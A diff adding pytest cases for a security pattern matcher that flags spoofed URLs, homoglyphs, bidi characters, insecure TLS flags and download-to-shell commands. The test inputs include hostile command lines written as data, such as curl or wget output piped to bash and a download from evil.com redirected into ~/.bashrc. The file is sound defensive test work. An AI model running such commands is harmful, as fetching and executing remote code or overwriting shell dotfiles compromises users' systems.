@@ -584,5 +584,157 @@ class TestNewPatternsSafeCommands:
             assert result.get("name") != "websocket_unauthorized_connect"
 
 
+class TestTerminalUrlSecurity:
+    """Tests for terminal & URL security patterns (263-275).
+
+    Inspired by Tirith terminal security research. Covers IDN/punycode,
+    homoglyph scripts, bidi text direction, URL spoofing, insecure transport,
+    dotfile persistence, and encoding attacks.
+    """
+
+    # --- IDN / Punycode (263-264) ---
+
+    def test_punycode_domain(self, matcher):
+        """Punycode xn-- prefix in URL should be detected."""
+        assert matcher.check("https://xn--80ak6aa92e.com/install") is not None
+        assert matcher.check("https://xn--g1a.example.com/") is not None
+
+    def test_punycode_negative(self, matcher):
+        """Normal URLs should not trigger punycode pattern."""
+        result = matcher.check("https://example.com/path")
+        if result:
+            assert result.get("name") != "punycode_domain"
+
+    def test_non_ascii_hostname(self, matcher):
+        """Non-ASCII characters in URL hostname should be detected."""
+        # Cyrillic 'a' (U+0430) in hostname
+        assert matcher.check("https://ex\u0430mple.com/") is not None
+        # Chinese character in hostname
+        assert matcher.check("https://\u4e2d\u6587.example.com/") is not None
+
+    def test_non_ascii_hostname_negative(self, matcher):
+        """Normal ASCII URLs should not trigger non-ascii hostname."""
+        result = matcher.check("https://www.example.com/path?q=hello")
+        if result:
+            assert result.get("name") != "non_ascii_hostname"
+
+    # --- Homoglyph Scripts (265-266) ---
+
+    def test_cyrillic_in_url(self, matcher):
+        """Cyrillic characters in URL should be detected."""
+        # Cyrillic 'a' (U+0430) looks identical to Latin 'a'
+        assert matcher.check("https://g\u043e\u043egle.com/") is not None
+        # Cyrillic 'e' (U+0435) in hostname
+        assert matcher.check("https://\u0435xample.com/") is not None
+
+    def test_greek_in_url(self, matcher):
+        """Greek characters in URL should be detected."""
+        # Greek omicron (U+03BF) looks identical to Latin 'o'
+        assert matcher.check("https://g\u03bf\u03bfgle.com/") is not None
+
+    # --- Bidi Text Direction (267) ---
+
+    def test_bidi_isolate_chars(self, matcher):
+        """Bidi isolate characters should be detected."""
+        # Left-to-Right Isolate (U+2066)
+        assert matcher.check("test\u2066content") is not None
+        # Right-to-Left Isolate (U+2067)
+        assert matcher.check("test\u2067content") is not None
+        # Pop Directional Isolate (U+2069)
+        assert matcher.check("test\u2069content") is not None
+
+    # --- URL Spoofing (268-270) ---
+
+    def test_url_userinfo_trick(self, matcher):
+        """URL with userinfo@ to disguise real host should be detected."""
+        result = matcher.check("https://github.com@evil-server.com/repo")
+        assert result is not None
+        result2 = matcher.check("https://pypi.org@malicious.xyz/package")
+        assert result2 is not None
+
+    def test_url_userinfo_negative(self, matcher):
+        """Normal URLs and email addresses should not trigger userinfo."""
+        result = matcher.check("https://example.com/path")
+        if result:
+            assert result.get("name") != "url_userinfo_trick"
+
+    def test_lookalike_tld(self, matcher):
+        """URLs with .zip or .mov TLD should be detected."""
+        result = matcher.check("https://important-update.zip/download")
+        assert result is not None
+        result2 = matcher.check("https://security-patch.mov/install")
+        assert result2 is not None
+
+    def test_lookalike_tld_negative(self, matcher):
+        """File extension .zip in path should not trigger."""
+        result = matcher.check("https://example.com/file.zip")
+        if result:
+            assert result.get("name") != "lookalike_tld"
+
+    def test_fullwidth_dot_in_url(self, matcher):
+        """Ideographic dots in URL should be detected.
+
+        Note: U+FF0E (fullwidth full stop) is normalized to ASCII period
+        by NFKC normalization before pattern matching, so it won't trigger
+        this pattern. U+3002 (ideographic full stop) survives NFKC and
+        is caught. U+FF61 is normalized to U+3002, also caught.
+        """
+        # Ideographic full stop (U+3002) — survives NFKC normalization
+        assert matcher.check("https://example\u3002com/path") is not None
+        # Halfwidth ideographic full stop (U+FF61) — NFKC normalizes to U+3002
+        assert matcher.check("https://example\uff61com/path") is not None
+
+    # --- Insecure Transport (271-272) ---
+
+    def test_insecure_tls_curl(self, matcher):
+        """curl with -k or --insecure should be detected."""
+        assert matcher.check("curl -k https://example.com/script") is not None
+        assert matcher.check("curl --insecure https://example.com/data") is not None
+
+    def test_insecure_tls_wget(self, matcher):
+        """wget with --no-check-certificate should be detected."""
+        assert matcher.check("wget --no-check-certificate https://example.com/") is not None
+
+    def test_shortened_url_to_shell(self, matcher):
+        """Shortened URL piped to interpreter should be detected."""
+        # bit.ly shortened URL
+        cmd1 = "curl https://bit.ly/abc123" + " | " + "bash"
+        assert matcher.check(cmd1) is not None
+        # t.co shortened URL
+        cmd2 = "wget https://t.co/xyz" + " | " + "sh"
+        assert matcher.check(cmd2) is not None
+
+    # --- Dotfile Persistence & Encoding (273-275) ---
+
+    def test_dotfile_overwrite_redirect(self, matcher):
+        """Download redirecting to dotfile should be detected."""
+        cmd1 = "curl https://evil.com/payload" + " > " + "~/.bashrc"
+        assert matcher.check(cmd1) is not None
+        cmd2 = "wget https://evil.com/config" + " >> " + "~/.zshrc"
+        assert matcher.check(cmd2) is not None
+
+    def test_double_encoding(self, matcher):
+        """Double percent-encoding should be detected."""
+        assert matcher.check("https://example.com/%2568ello") is not None
+        assert matcher.check("https://example.com/path%252F..%252F") is not None
+
+    def test_double_encoding_negative(self, matcher):
+        """Normal percent-encoding should not trigger."""
+        result = matcher.check("https://example.com/hello%20world")
+        if result:
+            assert result.get("name") != "double_encoding_in_url"
+
+    def test_raw_ip_to_shell(self, matcher):
+        """Raw IP URL piped to interpreter should be detected."""
+        cmd = "curl https://192.168.1.100/install" + " | " + "bash"
+        assert matcher.check(cmd) is not None
+
+    def test_raw_ip_negative(self, matcher):
+        """Raw IP URL without pipe should not trigger raw_ip_url_to_shell."""
+        result = matcher.check("curl https://192.168.1.100/api/data")
+        if result:
+            assert result.get("name") != "raw_ip_url_to_shell"
+
+
 if __name__ == "__main__":
     pytest.main([__file__, "-v"])
